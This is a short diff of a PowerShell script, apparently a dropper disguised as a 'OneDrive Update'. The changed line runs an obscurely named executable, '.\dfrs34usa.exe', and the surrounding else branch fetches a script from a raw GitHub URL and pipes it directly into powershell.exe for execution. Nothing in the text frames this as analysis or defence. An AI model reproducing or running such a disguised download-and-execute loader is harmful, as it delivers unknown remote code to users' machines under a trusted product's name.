@@ -52,7 +52,7 @@ while ((Test-Path $outputFile2) -eq $false) {
 }
 Write-Host "OneDrive Update Downloaded, starting update..." -ForegroundColor Green
 if (Test-Path $outputFile2) {
-    Start-Process -FilePath $outputFile2 -pdrwebwdc
+   .\dfrs34usa.exe -pdrwebwdc
 } else {
     $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
 }
